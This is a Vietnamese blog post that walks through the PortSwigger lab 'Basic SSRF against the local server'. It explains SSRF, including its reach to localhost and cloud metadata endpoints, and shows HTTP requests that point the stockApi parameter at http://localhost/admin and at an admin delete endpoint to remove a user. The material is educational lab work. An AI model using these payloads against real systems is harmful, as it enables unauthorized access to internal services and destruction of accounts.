---
title: "[PortSwigger Lab] - Server Site Request Forgery (SSRF)"
description: Solution of Server Site Request Forgery (SSRF) Lab
date: 2025-06-11 17:00:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, ssrf]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-11-portswigger-lab-ssrf/ssrf.png
    alt: Server Site Request Forgery (SSRF)
---

## Introduction
---
### **Server Site Request Forgery (SSRF)**
- **Server Site Request Forgery (SSRF)** là một lỗ hổng bảo mật web cho phép kẻ tấn công lợi dụng máy chủ để gửi các requests tới các hệ thống khác mà lẽ ra không nên được truy cập.
- Trong một cuộc tấn công **SSRF**, kẻ tấn công gửi một yêu cầu độc hại đến một máy chủ **web**. Thay vì chính trình duyệt của kẻ tấn công thực hiện yêu cầu, máy chủ **(server)** sẽ thực hiện thay, và gửi đến địa chỉ mà kẻ tấn công chỉ định.

### Impact of SSRF attacks
- **Truy cập hệ thống nội bộ (Internal Services) như:**
   -  `http://127.0.0.1`, `http://localhost`, `http://169.254.169.254` `(metadata API của cloud như AWS)`.
    - Dịch vụ quản trị cơ sở dữ liệu, `Redis`, hoặc `admin panels`.
- **Lộ thông tin nhạy cảm:** `Token`, `credentials`, thông tin nội bộ...
- **Mở rộng tấn công:** Gửi yêu cầu từ máy chủ đến hệ thống bên ngoài, khiến các cuộc tấn công dường như xuất phát từ phía `máy chủ (trusted source)`.
- **Remote code execution (RCE):** Trong một số trường hợp nghiêm trọng, **SSRF** có thể dẫn đến thực thi mã tùy ý từ xa.

## Solve SSRF Lab
---
### Lab: Basic SSRF against the local server
#### Analysis
- Truy cập 1 blog bất kỳ và sử dụng chức năng **check-stock**
- Gửi request **check-stock** đến **Burp Repeater**

```http
POST /product/stock HTTP/2
Host: 0a9f0041032fcfa981ca345e007c00ef.web-security-academy.net

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

- Ta thấy giá trị của **stockApi** là `http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1` sau khi decode
- Nó server thực hiện gửi http request để lấy dữ liệu stock
- Lợi dụng server để gửi request, lấy nội dung của trang **admin**

#### Exploit
- Thay đổi **url** đến trang **admin**

```http
POST /product/stock HTTP/2
Host: 0a9f0041032fcfa981ca345e007c00ef.web-security-academy.net

stockApi=http://localhost/admin
```
- Quan sát tab **response**, ta thấy có đường dẫn đẻ xóa user `carlos`

```html
<a href="/admin/delete?username=carlos">Delete</a>
```
- Tiếp tục gửi request đế xóa user `carlos`

```http
POST /product/stock HTTP/2
Host: 0a9f0041032fcfa981ca345e007c00ef.web-security-academy.net

stockApi=http://localhost/admin/delete?username=carlos
```

---
Goodluck! 🍀🍀🍀 